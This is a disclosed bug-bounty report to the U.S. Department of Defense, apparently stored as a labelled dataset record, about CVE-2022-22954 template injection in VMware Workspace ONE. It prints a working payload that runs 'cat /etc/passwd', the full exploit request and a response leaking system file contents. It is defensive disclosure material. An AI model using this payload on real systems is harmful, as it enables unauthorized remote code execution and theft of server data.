{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "fulldash ",
  "title": "\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 vulnerable to CVE-2022-22954",
  "content": "\nI found that one of the targets belongs to DOD vulnerable to CVE-2022-22954 where an attacker may be able to execute any malicious code like escalating Remote code execution is also possible\nTechnical Summary:\nCVE-2022-22954 is a server-side template injection vulnerability in the VMware Workspace ONE Access and Identity Manager. This vulnerability was assigned a CVSSv3 score of 9.8. An unauthenticated attacker with network access could exploit this vulnerability by sending a specially crafted request to a vulnerable VMware Workspace ONE or Identity Manager. Successful exploitation could result in remote code execution by exploiting a server-side template injection flaw.\nVulnerable URL:\nhttps://\u2588\u2588\u2588\u2588/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d\nImpact\nThe impact of server-side template injection vulnerabilities is generally critical, resulting in remote code execution by taking full control of the back-end server. Even without the code execution, the attacker may be able to read sensitive data on the server\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nVMware workspace One\nCVE Numbers\nCVE-2022-22954\nSteps to Reproduce\nVisit the vulnerable URL https://\u2588\u2588\u2588\u2588 and Intercept the request in burp suite\nAppend the following endpoint /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d and analyze the response you will see the contents of /etc/passwd\nRequest:\nCode 767 Bytes\n1GET /catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: LOGIN_XSRF=NSlYKinVNwgOtuT; JSESSIONID=A86B60C5FD0B58346764D1FB01DAF155\n4User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Upgrade-Insecure-Requests: 1\n9Sec-Fetch-Dest: document\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-Site: none\n12Sec-Fetch-User: ?1\n13Cache-Control: max-age=0\n14Te: trailers\n15Connection: close\nResponse:\nCode 2.95 KiB\n1HTTP/1.1 400 \n2Vary: Origin\n3Vary: Access-Control-Request-Method\n4Vary: Access-Control-Request-Headers\n5Set-Cookie: EUC_XSRF_TOKEN=6386e149-ff55-4a34-b474-30e6c0c62299; Path=/catalog-portal; Secure\n6Cache-Control: no-cache,private\n7X-Content-Type-Options: nosniff\n8X-XSS-Protection: 1; mode=block\n9Strict-Transport-Security: max-age=31536000 ; includeSubDomains\n10X-Frame-Options: SAMEORIGIN\n11Content-Type: text/html;charset=UTF-8\n12Content-Language: en-US\n13Date: Mon, 11 Apr 2022 15:03:40 GMT\n14Connection: close\n15Content-Length: 3576\n16\n17<!DOCTYPE HTML>\n18<html xmlns=\"http://www.w3.org/1999/html\">\n19<head>\n20    <title>Error Page</title>\n21    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\"/>\n22    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/>\n23    <style>\n24        body {\n25            background: #465361;\n26        }\n27\n28        .error-container {\n29            position: fixed;\n30            top: 50%;\n31            left: 50%;\n32            transform: translate(-50%, -50%);\n33            -ms-transform: translate(-50%, -50%);\n34            text-align: center;\n35            width: 25%;\n36            background-color: #fff;\n37            padding: 20px;\n38            box-shadow: 0 3px 2px -2px rgba(0, 0, .5, 0.35);\n39            border-radius: 4px;\n40        }\n41\n42        .error-img-container svg {\n43            width: 40px;\n44        }\n45\n46        .error-text-heading {\n47            font-weight: bold;\n48            padding-top: 5px;\n49            padding-bottom: 10px;\n50        }\n51\n52        .error-text-container a {\n53            text-decoration: none;\n54        }\n55    </style>\n56</head>\n57\n58<body>\n59<div class=\"error-container\">\n60    <div class=\"error-img-container\">\n61        <svg id=\"icon-warning-big\" xmlns=\"http://www.w3.org/2000/svg\" width=\"32\" height=\"32\" viewBox=\"0 0 32 32\">\n62            <path d=\"M28.48,24.65,17.64,5.88a1.46,1.46,0,0,0-1.28-.74h0a1.46,1.46,0,0,0-1.28.74L4.25,24.64a1.48,1.48,0,0,0,1.28,2.22H27.2a1.48,1.48,0,0,0,1.28-2.21Zm-1.07.86a.24.24,0,0,1-.21.12H5.53a.24.24,0,0,1-.21-.37L16.15,6.49a.24.24,0,0,1,.21-.12h0a.24.24,0,0,1,.21.12L27.41,25.26A.23.23,0,0,1,27.41,25.51Z\"\n63                  fill=\"#991700\" stroke-width=\"0\"/>\n64            <circle cx=\"16.36\" cy=\"13.53\" r=\"0.92\" fill=\"#f38b00\" stroke-width=\"0\"/>\n65            <path d=\"M16.36,16.43a.62.62,0,0,0-.62.62v5.55a.62.62,0,0,0,1.23,0V17A.62.62,0,0,0,16.36,16.43Z\"\n66                  fill=\"#991700\" stroke-width=\"0\"/>\n67        </svg>\n68    </div>\n69    <div class=\"error-text-heading\">Request Failed</div>\n70    <div class=\"error-text-container\">\n71        <p>Please contact your IT Administrator.</p>\n72        <a href=\"/catalog-portal/ui/logout?error=&deviceUdid=$%7B%22freemarker.template.utility.Execute%22?new()(%22cat%20/etc/passwd%22)%7D\">Sign Out</a>\n73    </div>\n74</div>\n75</body>\n76<script>\n77    if (console && console.log) {\n78        console.log(\"auth.context.invalid\");\n79        console.log(\"Authorization context is not valid. Login request  received with tenant code: \u2588\u2588\u2588\u2588\u2588\u2588\u2588, device id: root:x:0:0:root:/root:/bin/bash\\nbin:x:1:1:bin:/dev/null\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n80    }\n81</script>\n82</html>\nAs you can see the above response, which contains the response of /etc/passwd in the response\nSuggested Mitigation/Remediation Actions\nUpdate the Instance to the latest version\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1651255080,
  "report_url": "https://hackerone.com/reports/1537543",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Visit the vulnerable URL and intercept the request using a tool like Burp Suite"
    ],
    [
      2,
      "Append the crafted endpoint '/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%29%7d' to the request and analyze the response"
    ]
  ],
  "vuln_description": "CVE-2022-22954 is a server-side template injection vulnerability in VMware Workspace ONE Access and Identity Manager, allowing unauthenticated remote code execution. An attacker can exploit this by sending a specially crafted request to a vulnerable instance, potentially gaining full control of the server.",
  "reason": "The vulnerability involves a straightforward injection attack with a known payload. The complexity is low because the attack does not require multiple components, complex state manipulation, or novel logic. The payload is publicly documented for this specific CVE.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a server-side template injection (SSTI) leading to remote code execution (RCE), which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting injection vulnerabilities or RCE.",
    "is_detectable": false
  }
}